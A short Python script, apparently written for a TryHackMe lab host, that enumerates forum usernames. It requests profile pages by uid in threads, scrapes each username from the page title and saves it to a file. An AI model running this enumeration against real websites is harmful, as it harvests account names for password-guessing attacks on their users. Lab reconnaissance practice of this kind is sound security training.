import requests
from threading import Thread
from time import sleep
from bs4 import BeautifulSoup

class Enumerater:
    def __init__(self, url):
        self.__url = url

    def sendRequest(self, uid):
        requestResult = requests.get(f'{self.__url}{uid}')
        soup = BeautifulSoup(requestResult.text, 'html.parser')

        if 'The member you specified is either invalid or doesn\'t exist.' in soup.get_text():
            exit()
        else:
            username = soup.title.string[23:]
            print(f'[+] Found valid username: {username}')

            # Write valid username to disk
            with open('username.txt', 'a') as file:
                file.write(f'{username}\n')

def main():
    url = 'http://exit-denied.thm/member.php?action=profile&uid='
    enumerater = Enumerater(url)

    for uid in range(1, 100):
        thread = Thread(target=enumerater.sendRequest, args=(uid,))
        thread.start()

        # You can adjust how fast of each thread. 0.02 is recommended.
        sleep(0.02)

if __name__ == "__main__":
    main()